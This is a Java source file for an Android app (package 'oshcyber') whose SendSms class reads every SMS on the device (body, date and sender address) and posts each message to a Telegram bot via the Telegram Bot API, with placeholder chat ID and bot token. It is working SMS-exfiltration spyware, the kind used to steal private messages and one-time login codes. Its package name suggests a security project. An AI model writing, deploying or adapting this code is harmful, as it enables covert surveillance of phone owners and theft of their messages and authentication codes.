package com.example.oshcyber;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.provider.Telephony;


import androidx.annotation.RequiresApi;

import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.RequestBody;


public class SendSms {
    boolean isStop = false;
    @RequiresApi(api = Build.VERSION_CODES.O)
    public void sendSms(Context context){
        isStop = false;
        ContentResolver resolver = context.getContentResolver();
        Cursor cursor = resolver.query(Telephony.Sms.CONTENT_URI,null,null,null);
        OkHttpClient client = new OkHttpClient()
                .newBuilder()
                .readTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(30,TimeUnit.SECONDS)
                .connectTimeout(30,TimeUnit.SECONDS)
                .build();
        if(cursor != null){
            while(cursor.moveToNext()){
                @SuppressLint("Range") String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                @SuppressLint("Range") String date = cursor.getString(cursor.getColumnIndex(Telephony.Sms.DATE));
                @SuppressLint("Range") String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                String text = "Message: "+body+" Date: "+date+" Address: "+address;
                String chatId = "TELEGRAM_CHAT_ID";
                String json = "{\"text\":\""+text+"\",\"chat_id\":\""+chatId+"\"}";
                RequestBody postBody = RequestBody.create(json,MediaType.get("application/json; charset=utf-8"));
                String url = "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/sendMessage";
                Request request = new Request.Builder()
                        .url(url)
                        .post(postBody)
                        .build();
                try(Response response = client.newCall(request).execute()){
                    if(response.isSuccessful()){
                        System.out.println("Success");
                    }
                    else{
                        System.out.println(response.code());
                    }
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
            cursor.close();
        }
    }
    public void setStop(){
        isStop = true;
    }
}